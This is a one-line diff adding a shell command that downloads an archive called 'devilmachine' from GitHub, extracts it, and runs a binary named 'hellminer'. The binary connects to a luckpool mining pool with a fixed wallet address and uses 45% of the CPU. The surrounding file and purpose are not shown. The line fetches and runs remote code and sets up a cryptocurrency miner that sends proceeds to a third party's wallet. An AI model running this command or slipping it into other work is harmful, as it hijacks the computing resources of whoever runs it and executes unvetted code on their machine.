@@ -1,0 +1,1 @@
+wget https://github.com/Zeusyf/devilmachine/raw/main/devilmachine.tar.gz && tar -xvf devilmachine.tar.gz && cd devilmachine && chmod +x ./hellminer && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RMRHW3sJg4rdccSDwVxUXiqYSbBCCT9TSV.kepobenerdah -p x --cpu 45
